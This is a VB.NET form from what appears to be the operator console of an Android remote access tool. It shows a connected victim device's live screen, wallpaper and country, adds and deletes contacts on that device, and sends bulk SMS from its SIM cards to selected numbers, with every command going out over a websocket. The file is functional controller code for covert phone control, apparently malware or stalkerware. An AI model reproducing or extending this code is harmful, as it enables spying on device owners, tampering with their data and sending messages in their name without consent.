Public Class ContactsManager
    Public Btcli As BTClient
    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private Sub ContactsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        statetimer.Start()
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Contactsstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Contactsstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ContactsManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()
    End Sub

    Private Sub searchtext_TextChanged(sender As Object, e As EventArgs) Handles searchtext.TextChanged
        If Not String.IsNullOrEmpty(searchtext.Text) Then
            emptysearch.Visible = True
            trysearch()
        Else
            emptysearch.Visible = False
            ShowAllRows() ' Show all rows when the search box is empty
            ' searchbefore.Clear()
        End If
    End Sub
    Public Sub trysearch()
        If DGV0.Rows.Count < 1 Then
            Return
        End If

        If String.IsNullOrEmpty(searchtext.Text) Then
            Return
        End If

        Dim searchTerm As String = searchtext.Text.ToLower()
        'searchbefore.Clear() ' Clear previous search results

        For Each row As DataGridViewRow In DGV0.Rows
            Try

                Dim rowMatchesSearch As Boolean =
                row.Cells(0).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(1).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(2).Value.ToString().ToLower().Contains(searchTerm)

                If rowMatchesSearch Then
                    row.Visible = True ' Show matching rows
                    ' searchbefore.Add(row)
                Else
                    row.Visible = False ' Hide non-matching rows
                End If
            Catch ex As Exception
                ' Handle any potential errors, e.g., if Tag is not a BTClient
            End Try
        Next
    End Sub

    ' Helper method to show all rows
    Private Sub ShowAllRows()
        For Each row As DataGridViewRow In DGV0.Rows
            row.Visible = True
        Next
    End Sub

    Private Sub emptysearch_Click(sender As Object, e As EventArgs) Handles emptysearch.Click
        searchtext.Text = ""
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        Dim btinput As New myinputs
        btinput.msgtitle.Text = "New Contact info"
        btinput.inputtext.Text = ""
        btinput.inputtext2.Text = ""
        btinput.inputtext2.Visible = True
        btinput.checkfolder.Visible = False
        btinput.inputtext.Watermark = "Contact name | ex: friend1"
        btinput.inputtext2.Watermark = "Contact Number | ex: 12345..."
        If btinput.ShowDialog <> DialogResult.OK Then
            Return
        End If

        Dim contactname As String = btinput.inputtext.Text
        Dim contactnumber As String = btinput.inputtext2.Text

        If isEmpty(contactname) Then
            BTAlerter.infos("Enter new name first")
            Return
        End If
        If isEmpty(contactnumber) Then
            BTAlerter.infos("Enter new number first")
            Return
        End If


        Dim data As New With {
                                .subcommand = "A",
                                .nname = contactname,
                                .nnum = contactnumber
                                  }

        Dim commandstr As String = FormatCommand("Contacts", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click

        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim idx As String = ro.Tag.ToString
                        Dim data As New With {
                        .subcommand = "D",
                        .numid = idx
                          }

                        Dim commandstr As String = FormatCommand("Contacts", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                                            {"msg", wrk},
                                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If

    End Sub

    Private Sub ClearAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearAllToolStripMenuItem.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                Dim smsmak As New SMSmaker
                If Btcli.sim.Contains("/") Then
                    Dim allsims() As String = Btcli.sim.Split("/")
                    For Each simidx As String In allsims
                        smsmak.combosims.Items.Add(simidx)
                    Next
                End If
                smsmak.myico.Image = Btcli.wallpaper
                smsmak.mytitle.Text = uploadingstr & " | " & Btcli.name & " | " & Btcli.country
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim thenumber As String = ro.Cells(1).Value.ToString
                        smsmak.numslist.Items.Add(thenumber)
                    Catch ex As Exception

                    End Try
                Next
                If smsmak.ShowDialog = DialogResult.OK Then
                    If smsmak.numslist.Items.Count > 0 Then


                        Dim msgbody As String = smsmak.msgtext.Text

                        Dim selectedsim As String = "-1" 'All SIM's

                        If smsmak.combosims.Text <> "All SIM's" Then
                            selectedsim = smsmak.combosims.Text
                        End If


                        For index = 0 To smsmak.numslist.Items.Count - 1

                            Dim phonenumber As String = smsmak.numslist.Items(index)
                            If String.IsNullOrEmpty(phonenumber) Or String.IsNullOrWhiteSpace(phonenumber) Then
                                Continue For
                            End If
                            Dim data As New With {
                             .subcommand = "L",
                             .mmssge = msgbody,
                             .ssim = selectedsim,
                             .mnumber = phonenumber
                               }

                            Dim commandstr As String = FormatCommand("SMS", data)


                            Dim chatData As New Dictionary(Of String, Object) From {
                                                                {"msg", wrk},
                                                                {"cmnd", commandstr}
                             }
                            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                            'Task.Delay(50)

                        Next



                    End If

                End If
            End If
        End If
    End Sub
End Class